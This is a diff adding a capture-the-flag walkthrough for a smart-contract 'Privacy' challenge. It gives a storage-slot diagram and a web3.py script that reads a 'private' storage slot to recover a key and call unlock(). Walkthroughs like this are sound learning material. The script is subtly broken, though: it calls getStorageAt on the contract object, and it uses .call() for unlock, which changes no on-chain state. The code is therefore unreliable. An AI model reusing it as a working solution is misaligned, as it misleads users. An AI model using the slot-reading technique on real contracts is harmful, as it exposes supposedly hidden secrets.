@@ -60,3 +60,42 @@ Looking at the code we discover this eye catching function :
   
   it requires that we pass a "_key" value that matches whatever value is present at the second item in an array named "data".
   
+  I have made a little illustration on the memory blocks of the code where all variables are stored
+```
+   ______________________
+  | bool public locked   | _______{32 bytes = slot 0}
+  |----------------------|
+  | uint256 public ID    | _______{32 bytes = slot 1}
+  |----------------------|
+  | uint 8               | 
+  | uint 8               | _______{sums up to 32 bytes = slot 2}        
+  | uint 16              |
+  |----------------------|
+  | data[0]              | _______{32 bytes = slot 3}
+  |----------------------|
+  | data[1]              | _______{32 bytes = slot 4}
+  |----------------------|
+  | data[2]              | _______{32 bytes = slot 5}
+  |______________________|
+```
+we know from our src that we are intrested in slot5.
+using web3.py to solve this:
+```python
+from web3 import Web3
+
+#setup our node
+INFURA = "our_choice_of_node"
+web3 = Web3(Web3.HTTPProvider(INFURA))
+
+#setup our contract
+target_address = '0xab3410.....'
+abi = 'abi' #you can always copy from remix
+target = web3.eth.contract(address=target_address,abi=abi)
+
+#do stuff
+print(target.getStorageAt(target_address,5))
+#we then convert our output to the required type for our unlock() function. i.e bytes 16.i just used an online converter :p
+key = 0x37bf84...
+target.functions.unlock(key).call()
+```
+That should be that for this challange .To verify ,call `locked()` which should return false.
